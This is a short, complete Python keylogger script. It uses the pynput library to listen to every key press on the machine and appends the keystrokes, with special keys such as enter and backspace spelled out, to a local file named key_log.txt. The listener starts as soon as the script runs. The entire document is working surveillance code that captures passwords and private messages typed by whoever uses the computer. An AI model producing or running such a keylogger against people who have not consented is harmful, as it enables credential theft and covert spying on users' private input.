#importing necessary library
from pynput import keyboard

#log file to store keystrokes
log_file = "key_log.txt"


#function to write keystrokes to log file
def write_to_log_file(key):
    with open(log_file, "a") as f:
        try:
            f.write(key.char)

        #writes special keys in a readable format    
        except AttributeError:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            elif key == keyboard.Key.backspace:
                f.write("[BACKSPACE]")
            else:
                f.write(f"[{key.name.upper()}]")

#function to start the keylogger
def start_keylogger():
    with keyboard.Listener(on_press=write_to_log_file) as listener:
        listener.join()

#start the keylogger
start_keylogger()   

